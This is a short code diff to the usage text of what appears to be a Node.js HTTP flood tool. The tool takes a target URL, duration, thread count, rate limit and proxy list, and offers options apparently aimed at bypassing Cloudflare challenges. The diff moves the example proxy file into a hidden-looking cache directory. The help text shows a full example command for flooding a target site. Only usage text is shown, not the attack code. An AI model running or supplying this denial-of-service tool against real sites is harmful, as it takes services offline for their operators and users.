@@ -89,7 +89,7 @@ if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     Developers to method: @resetcve - developer method // @shiftwise - recoding method
     How to use & example:
       node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>
-      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
+      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 bin/odd/.cache/proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full
     
     Options:
       --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
